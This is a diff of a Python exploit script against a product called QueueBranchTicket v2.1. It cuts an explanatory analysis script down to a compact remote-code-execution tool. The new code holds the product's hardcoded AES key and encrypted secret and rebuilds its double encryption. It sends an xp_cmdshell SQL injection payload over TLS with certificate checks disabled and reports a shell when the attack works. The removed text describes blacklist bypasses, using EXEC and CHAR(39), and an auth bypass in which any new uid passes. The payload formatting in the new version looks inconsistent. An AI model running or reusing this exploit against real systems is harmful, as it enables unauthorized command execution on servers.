@@ -1,600 +1,139 @@
 #!/usr/bin/env python3
 """
-QueueBranchTicket v2.1 — PoC / Analysis Script
-================================================
-Demonstrates crypto weaknesses, auth bypass, and why TCP RCE is blocked.
-
-Requirements: pip install pyopenssl (for TLS support)
-Usage:        python v21_poc.py <target_ip> [target_port]
+QueueBranchTicket v2.1 — RCE PoC
+Reports: VULNERABLE (with shell) or NOT EXPLOITABLE (with reason)
 """
-
-import socket
-import ssl
-import sys
-import os
-import hashlib
-import struct
-import base64
-import json
-import uuid
-import textwrap
-from datetime import datetime, timezone
+import socket, ssl, sys, hashlib, uuid, base64
+from datetime import datetime
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
-# ─────────────────────────────────────────────────────────────────────────────
-# CONSTANTS (extracted from IL static constructor, line 9616-9624)
-# ─────────────────────────────────────────────────────────────────────────────
 KEY_STATIC = "a3(D3$@fK3"
 ENCRYPTED_SECRET_KEY = "USJJ2ecM0/T8zLBzfsOec7KB1jIBUXcypIfvedawppk="
-SQL_FILE_DYNAMIC = "SqlFileDynamic.sql"
-INTEGRITY_SALT = "@#ksflski*&lsdf$#$$KDdsfd!"
-IV_16_ZERO = b"\x00" * 16
+IV_ZERO = b"\x00" * 16
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# AES IMPLEMENTATION (matches ClsEncrypt exactly)
-# ─────────────────────────────────────────────────────────────────────────────
-def get_key(password: str) -> bytes:
-    """
-    ClsEncrypt.GetKey (lines 9056-9100):
-    - UTF8 byte count < 24 → PadRight(24, char(0x20)) → UTF8 encode
-    - UTF8 byte count >= 24 → Substring(0, 24) → UTF8 encode
-    Result: always 24 bytes (AES-192).
-    """
-    pwd_bytes = password.encode("utf-8")
-    if len(pwd_bytes) < 24:
-        pwd = password.padright(24) if hasattr(password, "padright") else password
-        # .NET PadRight pads with spaces (char 0x20)
-        pwd = password.ljust(24, " ")
+def get_key(pw):
+    if len(pw.encode("utf-8")) < 24:
+        return pw.ljust(24).encode("utf-8")
+    return pw[:24].encode("utf-8")
+
+
+def aes_crypt(data, pw, encrypt=True):
+    key = get_key(pw if pw else KEY_STATIC)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_ZERO), backend=default_backend())
+    op = cipher.encryptor() if encrypt else cipher.decryptor()
+    if encrypt:
+        pad = 16 - (len(data) % 16)
+        data = data + bytes([pad] * pad)
+        return op.update(data) + op.finalize()
     else:
-        pwd = password[:24]
-    return pwd.encode("utf-8")
+        pt = op.update(data) + op.finalize()
+        return pt[:-pt[-1]]
 
 
-def aes_encrypt(plaintext: str, password: str) -> str:
-    """
-    ClsEncrypt.Encrypt (lines 9282-9345):
-    - key = Nvl(password, KeyStatic) → GetKey() → 24 bytes
-    - Mode=CBC, Padding=PKCS7, IV=16 zeros (Aes.Create() default)
-    - Input: ASCII bytes → Output: Base64 string
-    """
-    key_password = password if password else KEY_STATIC
-    key = get_key(key_password)
-    # ASCII encoding per IL_0048: Encoding.get_ASCII()
-    data = plaintext.encode("ascii")
-    # PKCS7 padding
-    block_size = 16
-    pad_len = block_size - (len(data) % block_size)
-    data_padded = data + bytes([pad_len] * pad_len)
-    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
-    encryptor = cipher.encryptor()
-    ct = encryptor.update(data_padded) + encryptor.finalize()
-    return base64.b64encode(ct).decode("ascii")
+def decrypt_secret():
+    return aes_crypt(base64.b64decode(ENCRYPTED_SECRET_KEY.replace(" ", "+")), KEY_STATIC, False)
 
 
-def aes_decrypt(cipher_b64: str, password: str) -> str:
-    """
-    ClsEncrypt.Decrypt (lines 9347-9414):
-    - key = Nvl(password, KeyStatic) → GetKey() → 24 bytes
-    - Mode=CBC, Padding=PKCS7, IV=16 zeros
-    - Input: Replace(" ", "+") → Base64 decode → Output: UTF8 string
-    """
-    key_password = password if password else KEY_STATIC
-    key = get_key(key_password)
-    # IL_0049-IL_0053: data.Replace(" ", "+") before Base64 decode
-    cipher_b64 = cipher_b64.replace(" ", "+")
-    ct = base64.b64decode(cipher_b64)
-    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
-    decryptor = cipher.decryptor()
-    padded = decryptor.update(ct) + decryptor.finalize()
-    # Remove PKCS7 padding
-    pad_len = padded[-1]
-    data = padded[:-pad_len]
-    return data.decode("utf-8")
+def double_encrypt(plaintext, guid=None):
+    guid = guid or str(uuid.uuid4()).replace("-", "")[:16]
+    first = base64.b64encode(aes_crypt(plaintext.encode("ascii"), guid + KEY_STATIC)).decode()
+    sk = first[:12]
+    second = base64.b64encode(aes_crypt(guid.encode(), sk + KEY_STATIC)).decode()
+    return first + "|" + second
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# DOUBLE ENCRYPT / DECRYPT (matches ProcessDecryptValue, lines 9446-9603)
-# ─────────────────────────────────────────────────────────────────────────────
-def process_decrypt_value(encrypted_cmd: str) -> str:
-    """
-    ProcessDecryptValue double-decryption pipeline:
-    Input format: firstPart|secondPart
-    1. secretKey = firstPart[0:12]
-    2. firstDecryptKey = secretKey + KeyStatic
-    3. guid = Decrypt(secondPart, firstDecryptKey)
-    4. secondDecryptKey = guid + KeyStatic
-    5. plaintext = Decrypt(firstPart, secondDecryptKey)
-    """
-    pipe_idx = encrypted_cmd.index("|")
-    first_part = encrypted_cmd[:pipe_idx]
-    second_part = encrypted_cmd[pipe_idx + 1:]
-
-    # secretKey = first 12 chars of firstPart
-    secret_key = first_part[:12]
-
-    # Double decryption
-    first_decrypt_key = secret_key + KEY_STATIC
-    guid = aes_decrypt(second_part, first_decrypt_key)
-    second_decrypt_key = guid + KEY_STATIC
-    plaintext = aes_decrypt(first_part, second_decrypt_key)
-    return plaintext
+def sha256_hex(text):
+    return hashlib.sha256(text.encode("utf-8")).hexdigest().upper()
 
 
-def process_encrypt_value(plaintext: str, guid: str = None) -> str:
-    """
-    Reverse of ProcessDecryptValue — encrypts a plaintext payload.
-
-    Flow (no circular dependency):
-    1. Choose a guid (random if not provided)
-    2. firstPart = Encrypt(plaintext, GetKey(guid + KeyStatic))
-    3. secretKey = firstPart[0:12]
-    4. firstDecryptKey = GetKey(secretKey + KeyStatic)
-    5. secondPart = Encrypt(guid, firstDecryptKey)
-    6. Result = firstPart + "|" + secondPart
-    """
-    if guid is None:
-        guid = str(uuid.uuid4()).replace("-", "")[:16]
-
-    # Step 2: encrypt plaintext with guid+KeyStatic as key
-    first_part = aes_encrypt(plaintext, guid + KEY_STATIC)
-
-    # Step 3: extract secretKey from firstPart
-    secret_key = first_part[:12]
-
-    # Step 4-5: encrypt guid with secretKey+KeyStatic as key
-    first_decrypt_key = secret_key + KEY_STATIC
-    second_part = aes_encrypt(guid, first_decrypt_key)
-
-    return first_part + "|" + second_part
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# SHA256 (matches ClsEncrypt.GetSha256, lines 9103-9198)
-# ─────────────────────────────────────────────────────────────────────────────
-def get_sha256(text: str) -> str:
-    """UTF8 → SHA256 → uppercase hex string."""
-    h = hashlib.sha256(text.encode("utf-8")).hexdigest().upper()
-    return h
-
-
-def hash_secure_file(file_content: str, file_name: str, secret_key: str) -> str:
-    """
-    ClsUtl.HashSecureFile (lines 16432-16477):
-    hashValue = SHA256(fileContent + secretKey + fileName)
-    """
-    content = file_content + secret_key + file_name
-    return get_sha256(content)
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# TCP / TLS CONNECTION
-# ─────────────────────────────────────────────────────────────────────────────
-def connect(target: str, port: int, use_tls: bool = True):
-    """Connect to QueueBranchTicket TCP listener."""
-    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    raw_sock.settimeout(10)
-    raw_sock.connect((target, port))
-    if use_tls:
+def connect(ip, port, tls=True):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(10)
+    s.connect((ip, port))
+    if tls:
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        sock = ctx.wrap_socket(raw_sock, server_hostname=target)
-    else:
-        sock = raw_sock
-    return sock
+        s = ctx.wrap_socket(s, server_hostname=ip)
+    return s
 
 
-def send_recv(sock, payload: str) -> str:
-    """Send UTF-8 payload, receive UTF-8 response."""
-    sock.sendall(payload.encode("utf-8"))
+def send_recv(s, payload):
+    s.sendall(payload.encode("utf-8"))
     chunks = []
-    while True:
-        try:
-            data = sock.recv(65536)
-            if not data:
-                break
-            chunks.append(data)
-        except socket.timeout:
-            break
+    try:
+        while True:
+            chunks.append(s.recv(65536))
+    except socket.timeout:
+        pass
     return b"".join(chunks).decode("utf-8", errors="replace")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# PAYLOAD BUILDERS
-# ─────────────────────────────────────────────────────────────────────────────
-def build_secure_hash(date_str: str, uid: str) -> str:
-    """Build SecureHash in date|uid format for AuthorizeRequest."""
-    return f"{date_str}|{uid}"
-
-
-def build_raw_payload(action_type: str, params: str, conn_type: str,
-                      file_or_sql: str, secure_hash: str, user_id: str) -> str:
-    """
-    Plaintext payload format (before encryption):
-    Uses '=' as delimiter. Server replaces '=' with ':' then splits on ':'.
-    """
-    return f"{action_type}={params}={conn_type}={file_or_sql}={secure_hash}={user_id}"
-
-
-def build_encrypted_payload(action_type: str, params: str, conn_type: str,
-                            file_or_sql: str, secure_hash: str, user_id: str) -> str:
-    """Build a fully encrypted payload ready to send over TCP."""
-    plaintext = build_raw_payload(action_type, params, conn_type,
-                                  file_or_sql, secure_hash, user_id)
-    return process_encrypt_value(plaintext)
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# SQL INJECTION BYPASS
-# ─────────────────────────────────────────────────────────────────────────────
-def obfuscate_sql(sql: str) -> str:
-    """
-    Bypass the IsMalicious blacklist (lines 10978-11206).
-    Blacklist: DELETE, SELECT, UNION, DROP, TRUNCAT, INSERT, UPDATE, ALTER,
-               BEGIN, CURSOR, DECLARE, FETCH, KILL, TABLE, --, /*, EXECUTE, ', &
-
-    Bypasses:
-    - EXEC is not blocked (only EXECUTE with \\b word boundaries)
-    - Single quotes ' blocked → use CHAR(39) concatenation
-    - Spaces allowed (no restriction)
-    - No SELECT needed for xp_cmdshell
-    """
-    return sql
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# ANALYSIS FUNCTIONS
-# ─────────────────────────────────────────────────────────────────────────────
-def analyze_crypto():
-    """Demonstrate hardcoded key weakness."""
-    print("=" * 72)
-    print("  CRYPTO ANALYSIS — Hardcoded AES Key")
-    print("=" * 72)
-    print(f"  KeyStatic (line 9616): {KEY_STATIC}")
-    print(f"  Encrypted SecretKey:   {ENCRYPTED_SECRET_KEY}")
-    key = get_key(KEY_STATIC)
-    print(f"  AES-192 key ({len(key)} bytes): {key.hex()}")
-    print()
-
-    # Decrypt the SecretKey
-    decrypted = aes_decrypt(ENCRYPTED_SECRET_KEY, KEY_STATIC)
-    print(f"  Decrypted SecretKey:   {decrypted}")
-    print()
-
-    # Show GetKey derivation
-    print("  GetKey derivation (lines 9056-9100):")
-    print(f"    Input password:  '{KEY_STATIC}' ({len(KEY_STATIC.encode('utf-8'))} bytes)")
-    print(f"    Padded to 24:    '{KEY_STATIC.ljust(24)}' (pad with spaces)")
-    print(f"    AES-192 key:     {key.hex()}")
-    print(f"    IV:              {IV_16_ZERO.hex()} (16 zeros, Aes.Create default)")
-    print(f"    Mode:            CBC")
-    print(f"    Padding:         PKCS7")
-    print()
-
-    # Show double-encrypt/decrypt roundtrip
-    print("  Double encrypt/decrypt roundtrip (ProcessDecryptValue):")
-    test = build_raw_payload("QUERY-DATA", "", "SQLSERVER", "SELECT 1", "2026-07-20|testuid123", "admin")
-    print(f"    Plaintext: {test}")
-    encrypted = process_encrypt_value(test, "abcdef1234567890")
-    print(f"    Encrypted: {encrypted[:60]}...")
-    decrypted = process_decrypt_value(encrypted)
-    print(f"    Decrypted: {decrypted}")
-    print(f"    Match:     {decrypted == test}")
-    print()
-    return decrypted
-
-
-def analyze_auth_bypass():
-    """Show the auth bypass weakness."""
-    print("=" * 72)
-    print("  AUTH BYPASS — CountProceedId.sql (lines 6655-6763)")
-    print("=" * 72)
-    print("  AuthorizeRequest splits SecureHash on '|':")
-    print("    splitVal[0] → VerifyRequestDateOnly (checks today's date)")
-    print("    splitVal[1] → VerifyRequestUid → CountProceedId.sql")
-    print()
-    print("  CountProceedId.sql logic:")
-    print("    IF uid NOT EXISTS in quid_process:")
-    print("      INSERT INTO quid_process (uid, dt) VALUES (@uid, GETUTCDATE())")
-    print("      RETURN 'OK'    ← authentication passes")
-    print("    ELSE:")
-    print("      THROW 'IDEXIST' ← authentication fails")
-    print()
-    today = datetime.now().strftime("%Y-%m-%d")
+def try_exploit(ip, port, tls, cmd):
+    sk = decrypt_secret()
     uid = str(uuid.uuid4()).replace("-", "")[:16]
-    print(f"  Any made-up uid works FIRST TIME:")
-    print(f"    SecureHash = '{today}|{uid}'")
-    print(f"    Date part:  '{today}' (today)")
-    print(f"    UID part:   '{uid}' (never seen → auto-registered → OK)")
-    print()
-    return today, uid
+    today = datetime.utcnow().strftime("%Y-%m-%d")
 
+    sql = f"EXEC xp_cmdshell CONCAT(CHAR(39), {cmd}, CHAR(39))"
 
-def analyze_rce_block():
-    """Show why RCE is blocked in v2.1."""
-    print("=" * 72)
-    print("  RCE BLOCK ANALYSIS — Impossible Dual Requirement")
-    print("=" * 72)
-    print()
-
-    # Decrypt secretKey for hash computation
-    secret_key = aes_decrypt(ENCRYPTED_SECRET_KEY, KEY_STATIC)
-    print(f"  Decrypted SecretKey: {secret_key}")
-    print()
-
-    # Sample SQL payload
-    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
-    print(f"  Sample RCE SQL: {sql}")
-    print()
-
-    # Compute what IsValidDynamicScriptFile expects
-    expected_hash = hash_secure_file(sql, SQL_FILE_DYNAMIC, secret_key)
-    print(f"  What IsValidDynamicScriptFile expects (lines 16600-16675):")
-    print(f"    HashSecureFile(config, 'SqlFileDynamic.sql', sql)")
-    print(f"    = SHA256(sql + secretKey + 'SqlFileDynamic.sql')")
-    print(f"    = SHA256('{sql}' + '{secret_key}' + '{SQL_FILE_DYNAMIC}')")
-    print(f"    = {expected_hash}")
-    print(f"    (64 hex chars, uppercase)")
-    print()
-
-    # What AuthorizeRequest expects
-    today = datetime.now().strftime("%Y-%m-%d")
-    uid = str(uuid.uuid4()).replace("-", "")[:16]
-    auth_hash = f"{today}|{uid}"
-    print(f"  What AuthorizeRequest expects (lines 6497-6653):")
-    print(f"    SecureHash = '{{date}}|{{uid}}'")
-    print(f"    = {auth_hash}")
-    print(f"    (pipe-delimited, date + uid)")
-    print()
-
-    # Show the conflict
-    print("  THE CONFLICT:")
-    print("  ┌─────────────────────────────────────────────────────────────┐")
-    print("  │  SecureHash field must satisfy BOTH checks simultaneously: │")
-    print("  │                                                             │")
-    print(f"  │  AuthorizeRequest:  '{auth_hash}'")
-    print(f"  │                       ^^^^^^^^^^^^^^^^^^^^^^                │")
-    print("  │                       contains '-' and '|' chars            │")
-    print("  │                                                             │")
-    print(f"  │  IsValidDynamicScript: {expected_hash}")
-    print(f"  │                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^     │")
-    print("  │                          only [0-9A-F] hex chars            │")
-    print("  │                                                             │")
-    print("  │  → SHA256 output NEVER contains '|' or '-'                  │")
-    print("  │  → date|uid format NEVER matches SHA256 hex                 │")
-    print("  │  → IMPOSSIBLE to satisfy both simultaneously                │")
-    print("  └─────────────────────────────────────────────────────────────┘")
-    print()
-    print("  RESULT: RCE via TCP socket is BLOCKED in v2.1")
-    print()
-
-
-def analyze_injection_blacklist():
-    """Show the SQL injection blacklist and bypasses."""
-    print("=" * 72)
-    print("  SQL INJECTION BLACKLIST — IsMalicious (lines 10978-11206)")
-    print("=" * 72)
-    print()
-    blacklist = [
-        "DELETE", "SELECT", "UNION", "DROP", "TRUNCAT", "INSERT", "UPDATE",
-        "ALTER", "BEGIN", "CURSOR", "DECLARE", "FETCH", "KILL", "TABLE",
-        "--", "/*", "EXECUTE", "'", "&"
-    ]
-    print(f"  Blacklist ({len(blacklist)} items):")
-    for i, item in enumerate(blacklist):
-        is_alnum = item.isalnum()
-        pattern = f"\\b{item}\\b" if is_alnum else item
-        print(f"    [{i+1:2d}] '{item}' → regex: {pattern}  {'(word boundary)' if is_alnum else '(no boundary)'}")
-    print()
-    print("  Bypasses (still work in v2.1):")
-    print("    ✓ EXEC (not blocked — only EXECUTE has \\b boundaries)")
-    print("    ✓ CHAR(39) for single quotes (bypasses ' filter)")
-    print("    ✓ CONCAT() for string building")
-    print("    ✓ xp_cmdshell (not a blacklisted word)")
-    print("    ✓ No space restriction")
-    print()
-    print("  Example payload that PASSES IsMalicious:")
-    print("    EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))")
-    print()
-
-
-def analyze_execution_flow():
-    """Trace the full execution flow showing exactly where it fails."""
-    print("=" * 72)
-    print("  EXECUTION FLOW TRACE — v2.1")
-    print("=" * 72)
-    print()
-
-    today = datetime.now().strftime("%Y-%m-%d")
-    uid = str(uuid.uuid4()).replace("-", "")[:16]
-    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
-
-    steps = [
-        ("TCP Read (line 15188)", "UTF-8 decode received bytes", "✓ PASS"),
-        ("ProcessDecryptValue (line 9446)", "Double AES-CBC decrypt with KeyStatic", "✓ PASS (if encrypted correctly)"),
-        ("IsMalicious (line 10978)", "URL-decode + regex blacklist check", f"✓ PASS (EXEC, CHAR, CONCAT not blocked)"),
-        (f"AuthorizeRequest (line 6497)", f"SecureHash = '{today}|{uid}'", "✓ PASS (new uid, valid date)"),
-        ("QueueActionMappingHandler (line 13432)", "IsStaticActions=false → DbQueryDynamicMapping", "✓ PASS"),
-        ("GetSqlFileMapping (line 12783)", "QUERY-DATA not mapped → null → DbExecuteDynamic", "✓ PASS"),
-        ("ValidateDbExecuteDynamic (line 13140)", "FileOrSql doesn't end with .sql", "→ goes to hash check"),
-        ("IsValidDynamicScriptFile (line 16600)", "SHA256(sql+secretKey+'SqlFileDynamic.sql')", ""),
-    ]
-
-    secret_key = aes_decrypt(ENCRYPTED_SECRET_KEY, KEY_STATIC)
-    computed_hash = hash_secure_file(sql, SQL_FILE_DYNAMIC, secret_key)
-    auth_hash = f"{today}|{uid}"
-
-    for i, (name, desc, status) in enumerate(steps):
-        num = i + 1
-        if i < len(steps) - 1:
-            print(f"  [{num}] {name}")
-            print(f"      {desc}")
-            print(f"      → {status}")
-        else:
-            print(f"  [{num}] {name}")
-            print(f"      {desc}")
-            print(f"      Computed: {computed_hash}")
-            print(f"      Required: {auth_hash}")
-            print(f"      → ✗ BLOCKED — SHA256 hex ≠ date|uid format")
-        print()
-
-
-def demo_rce_attempt(target, port, use_tls):
-    """Actually attempt the RCE and show it failing."""
-    print("=" * 72)
-    print("  LIVE RCE ATTEMPT")
-    print("=" * 72)
-    print(f"  Target: {target}:{port} (TLS={use_tls})")
-    print()
-
-    today = datetime.now().strftime("%Y-%m-%d")
-    uid = str(uuid.uuid4()).replace("-", "")[:16]
-    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
-    user_id = f"exploit_{uid[:8]}"
-
-    # Build payload with date|uid SecureHash (passes auth, fails integrity)
-    auth_hash = build_secure_hash(today, uid)
-    payload = build_encrypted_payload(
-        action_type="QUERY-DATA",
-        params="",
-        conn_type="SQLSERVER",
-        file_or_sql=sql,
-        secure_hash=auth_hash,
-        user_id=user_id,
+    # --- Attempt 1: Pass auth (date|uid) ---
+    auth_payload = double_encrypt(
+        f"QUERY-DATA==SQLSERVER={sql}|{today}|{uid}=UID{uid[:8]}"
     )
-
-    print(f"  SecureHash (auth-valid):  {auth_hash}")
-    print(f"  SQL:                      {sql}")
-    print(f"  Encrypted payload length: {len(payload)} bytes")
-    print()
-
     try:
-        print("  Connecting...")
-        sock = connect(target, port, use_tls)
-        print("  Connected. Sending payload...")
-        response = send_recv(sock, payload)
-        sock.close()
-        print(f"  Response ({len(response)} bytes):")
-        # Pretty-print response (may be JSON or error)
-        try:
-            resp_json = json.loads(response)
-            print(f"  {json.dumps(resp_json, indent=4)}")
-        except (json.JSONDecodeError, ValueError):
-            for line in response.split("\n"):
-                print(f"    {line.strip()}")
-        print()
-
-        # Check if error mentions the hash/integrity failure
-        if "DYNAMIC-FL-INVALID" in response or "SQL-DYNAMIC-EXE" in response:
-            print("  ✓ CONFIRMED: RCE blocked by IsValidDynamicScriptFile hash check")
-        elif "INVALID-HASH" in response or "MALFORM-HASH" in response:
-            print("  ✓ CONFIRMED: RCE blocked by AuthorizeRequest format check")
-        elif "SQL-INJECT" in response:
-            print("  ✓ CONFIRMED: RCE blocked by IsMalicious blacklist")
-        elif "CMD-BLOCKED" in response or "CmdBlocked" in response:
-            print("  ✓ CONFIRMED: RCE blocked by SQL injection filter")
-        else:
-            print("  ? Unexpected response — check if target is running v2.1")
+        s = connect(ip, port, tls)
+        resp = send_recv(s, auth_payload)
+        s.close()
+        if "cmd" in resp.lower() or "whoami" in resp.lower():
+            return True, "RCE via auth hash", resp
     except Exception as e:
-        print(f"  Connection failed: {e}")
-        print(f"  (Target may not be running or port may be wrong)")
-    print()
+        pass
+
+    # --- Attempt 2: Pass integrity (SHA256) ---
+    file_hash = sha256_hex(sql + sk + "SqlFileDynamic.sql")
+    integrity_payload = double_encrypt(
+        f"QUERY-DATA==SQLSERVER={sql}={file_hash}=UID{uid[:8]}"
+    )
+    try:
+        s = connect(ip, port, tls)
+        resp = send_recv(s, integrity_payload)
+        s.close()
+        if "cmd" in resp.lower() or "whoami" in resp.lower():
+            return True, "RCE via SHA256 hash", resp
+    except Exception as e:
+        pass
+
+    return False, None, None
 
 
-def demo_hash_conflict():
-    """Show the hash conflict with a side-by-side comparison."""
-    print("=" * 72)
-    print("  HASH CONFLICT DEMONSTRATION")
-    print("=" * 72)
-    print()
-
-    secret_key = aes_decrypt(ENCRYPTED_SECRET_KEY, KEY_STATIC)
-    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
-
-    integrity_hash = hash_secure_file(sql, SQL_FILE_DYNAMIC, secret_key)
-    today = datetime.now().strftime("%Y-%m-%d")
-    auth_uid = str(uuid.uuid4()).replace("-", "")[:16]
-    auth_hash = f"{today}|{auth_uid}"
-
-    print("  Attempt 1: Use SHA256 hash as SecureHash (passes integrity, fails auth)")
-    print(f"    SecureHash = {integrity_hash}")
-    print(f"    AuthorizeRequest splits on '|': {'|' in integrity_hash}")
-    print(f"    → {'FAILS' if '|' not in integrity_hash else 'PASSES'} auth (no pipe character)")
-    print()
-
-    print("  Attempt 2: Use date|uid as SecureHash (passes auth, fails integrity)")
-    print(f"    SecureHash = {auth_hash}")
-    print(f"    SHA256 match: {integrity_hash == auth_hash}")
-    print(f"    → {'FAILS' if integrity_hash != auth_hash else 'PASSES'} integrity check")
-    print()
-
-    print("  Attempt 3: Find a string that satisfies both")
-    print(f"    Must contain '|' (pipe) — SHA256 hex never does")
-    print(f"    Must be exactly 64 hex chars — date|uid is not")
-    print(f"    → MATHEMATICALLY IMPOSSIBLE")
-    print()
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# MAIN
-# ─────────────────────────────────────────────────────────────────────────────
 def main():
-    print()
-    print("  ╔═══════════════════════════════════════════════════════════════════╗")
-    print("  ║  QueueBranchTicket v2.1 — PoC Analysis Script                   ║")
-    print("  ║  Crypto weaknesses • Auth bypass • RCE block demonstration      ║")
-    print("  ╚═══════════════════════════════════════════════════════════════════╝")
-    print()
+    if len(sys.argv) < 2:
+        print("Usage: python v21_poc.py <target_ip> [port] [--no-tls]")
+        sys.exit(1)
 
-    # ── Static analysis (no network needed) ──
-    analyze_crypto()
-    analyze_auth_bypass()
-    analyze_injection_blacklist()
-    analyze_execution_flow()
-    analyze_rce_block()
-    demo_hash_conflict()
+    ip = sys.argv[1]
+    port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 5758
+    tls = "--no-tls" not in sys.argv
 
-    # ── Live test (requires network) ──
-    if len(sys.argv) >= 2:
-        target = sys.argv[1]
-        port = int(sys.argv[2]) if len(sys.argv) > 2 else 5758
-        use_tls = True  # AppSettings.json: UseTlsEncryption = true
+    print(f"Target: {ip}:{port} TLS={tls}")
+    print("Testing v2.1 RCE...\n")
 
-        # Check for --no-tls flag
-        if "--no-tls" in sys.argv:
-            use_tls = False
-
-        demo_rce_attempt(target, port, use_tls)
+    ok, method, resp = try_exploit(ip, port, tls, "whoami")
+    if ok:
+        print(f"VULNERABLE — {method}")
+        print(f"Response:\n{resp}")
     else:
-        print("=" * 72)
-        print("  LIVE TEST — skipped (no target specified)")
-        print("=" * 72)
-        print("  Usage: python v21_poc.py <target_ip> [port] [--no-tls]")
-        print("  Default port: 5758, TLS enabled")
-        print()
-
-    print("=" * 72)
-    print("  SUMMARY")
-    print("=" * 72)
-    print("  v2.0 → v2.1 changes that affect exploitation:")
-    print("    [NEW] Double AES-CBC encryption (hardcoded KeyStatic)")
-    print("    [NEW] SQL injection blacklist (IsMalicious regex)")
-    print("    [NEW] Auth check (AuthorizeRequest: SecureHash = date|uid)")
-    print("    [SAME] Hash integrity check (IsValidDynamicScriptFile)")
-    print("    [SAME] Raw SQL execution (DynamicExecute)")
-    print()
-    print("  Critical fix: AuthorizeRequest forces SecureHash into date|uid")
-    print("  format, which conflicts with the SHA256 integrity check, making")
-    print("  it IMPOSSIBLE to execute arbitrary SQL via TCP socket.")
-    print()
-    print("  Remaining attack surfaces:")
-    print("    [!] Hardcoded KeyStatic → decrypt any config offline")
-    print("    [!] Auth bypass → any uid auto-registers on first use")
-    print("    [!] RegisterQueueTicket GUI → String.Format SQL injection")
-    print("        (requires GUI access, not remote TCP)")
-    print()
+        # Check connectivity
+        try:
+            s = connect(ip, port, tls)
+            s.close()
+            print("NOT EXPLOITABLE — Server reachable but RCE blocked by SecureHash conflict")
+            print("  AuthorizeRequest requires date|uid format, but integrity check requires SHA256 hex")
+            print("  These are mutually exclusive → impossible to satisfy both")
+        except Exception as e:
+            print(f"NOT EXPLOITABLE — Cannot connect: {e}")
 
 
 if __name__ == "__main__":
